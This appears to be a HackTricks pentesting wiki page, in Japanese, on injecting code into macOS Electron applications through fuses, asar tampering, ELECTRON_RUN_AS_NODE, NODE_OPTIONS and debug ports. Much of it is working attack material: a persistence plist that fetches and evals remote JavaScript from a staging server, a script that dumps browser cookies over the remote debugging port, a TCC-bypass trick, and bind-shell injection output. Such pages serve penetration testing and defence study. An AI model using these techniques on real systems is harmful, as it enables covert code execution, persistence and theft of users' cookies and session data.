# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Electronが何か知らない場合は、[**こちらにたくさんの情報があります**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。しかし、今はElectronが**node**を実行することだけを知っておいてください。\
そしてnodeには、指定されたファイル以外の**コードを実行させるために使用できる**いくつかの**パラメータ**と**環境変数**があります。

### Electron Fuses

これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用されるものです**：

- **`RunAsNode`**: 無効にすると、コードを注入するための環境変数**`ELECTRON_RUN_AS_NODE`**の使用が防止されます。
- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータが尊重されません。この方法でコードを注入するのを避けます。
- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**がmacOSによって**検証されます**。これにより、このファイルの内容を変更することによる**コード注入**が防止されます。
- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能**になります。
- **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。

コード注入を防がないもう一つの興味深いフューズは：

- **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアはOSレベルの暗号化キーを使用して暗号化されます。

### Electron Fusesの確認

アプリケーションからこれらのフラグを**確認することができます**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron フューズの変更

[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron フューズ**の設定は、**Electron バイナリ**内にあり、どこかに文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** が含まれています。

macOS アプリケーションでは、通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを[https://hexed.it/](https://hexed.it/)にロードし、前の文字列を検索できます。この文字列の後に、各ヒューズが無効か有効かを示すASCIIの数字「0」または「1」が表示されます。ヒューズの値を**変更する**には、16進数コード（`0x30`は`0`、`0x31`は`1`）を変更してください。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されないことに注意してください。

## RCEコードをElectronアプリケーションに追加する

Electronアプリが使用している**外部JS/HTMLファイル**がある可能性があるため、攻撃者はこれらのファイルにコードを注入し、その署名がチェックされないため、アプリのコンテキストで任意のコードを実行できます。

> [!CAUTION]
> ただし、現時点では2つの制限があります：
>
> - アプリを変更するには**`kTCCServiceSystemPolicyAppBundles`**権限が**必要**であり、デフォルトではこれがもはや可能ではありません。
> - コンパイルされた**`asap`**ファイルは通常、ヒューズ**`embeddedAsarIntegrityValidation`** `と` **`onlyLoadAppFromAsar`**が`有効`です。
>
> この攻撃経路をより複雑（または不可能）にします。

**`kTCCServiceSystemPolicyAppBundles`**の要件を回避することは可能で、アプリケーションを別のディレクトリ（例えば**`/tmp`**）にコピーし、フォルダ**`app.app/Contents`**の名前を**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、再び**`app.app/Contents`**に名前を戻して実行することができます。

asarファイルからコードを展開するには、次のコマンドを使用できます：
```bash
npx asar extract app.asar app-decomp
```
そして、次のように修正した後に再パッケージ化します:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)によると、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして開始されます。
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> フューズ **`RunAsNode`** が無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。

### アプリのPlistからのインジェクション

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数をplistで悪用して永続性を維持することができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

ペイロードを別のファイルに保存し、実行することができます:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> フューズ **`EnableNodeOptionsEnvironmentVariable`** が **無効** の場合、アプリは起動時に環境変数 **NODE_OPTIONS** を **無視** します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、フューズ **`RunAsNode`** が無効であれば、これも **無視** されます。
>
> **`ELECTRON_RUN_AS_NODE`** を設定しないと、次の **エラー** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### アプリのPlistからのインジェクション

これらのキーを追加することで、plist内のこの環境変数を悪用して永続性を維持できます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
例えば:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時にノードパラメータ（`--inspect` など）を **無視**します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、これもフューズ **`RunAsNode`** が無効になっていると **無視**されます。
>
> しかし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能ですが、前のペイロードは他のプロセスを実行するためには機能しません。

パラメータ **`--remote-debugging-port=9222`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能です（クッキーはブラウザ内で**復号化**され、クッキーを提供する**jsonエンドポイント**があります）。

その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができ、自動ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や次のようなシンプルなスクリプトを使用できます:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**このブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用されて、ヘッドレスChromeが**任意の場所に任意のファイルをダウンロード**します。

### アプリのPlistからのインジェクション

この環境変数をplistで悪用して、これらのキーを追加することで永続性を維持できます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCCバイパス：古いバージョンの悪用

> [!TIP]
> macOSのTCCデーモンは、実行されているアプリケーションのバージョンをチェックしません。したがって、**以前の技術を使用してElectronアプリケーションにコードを注入できない場合**、アプリの以前のバージョンをダウンロードしてコードを注入することができます。そうすれば、TCCの権限を取得します（Trust Cacheがそれを防がない限り）。

## 非JSコードの実行

前述の技術を使用すると、**Electronアプリケーションのプロセス内でJSコードを実行する**ことができます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、**TCCの権限を継承します**。\
したがって、カメラやマイクにアクセスするために権限を悪用したい場合は、**プロセスから別のバイナリを実行するだけで済みます**。

## 自動注入

ツール[**electroniz3r**](https://github.com/r3ggi/electroniz3r)は、**脆弱なElectronアプリケーション**を見つけてそれにコードを注入するために簡単に使用できます。このツールは、**`--inspect`**技術を使用しようとします：

自分でコンパイルする必要があり、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考文献

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
